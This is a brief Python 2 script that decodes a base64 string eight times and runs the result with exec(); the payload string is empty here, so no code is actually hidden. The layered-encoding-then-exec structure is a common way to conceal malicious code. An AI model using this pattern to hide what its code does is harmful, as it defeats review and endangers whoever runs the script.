import os, sys, getpass, time
import subprocess, base64
from __files import info, author, version
she = ''
he = base64.b64decode(she)
for i in xrange(7):
	he = base64.b64decode(he)
exec(he)
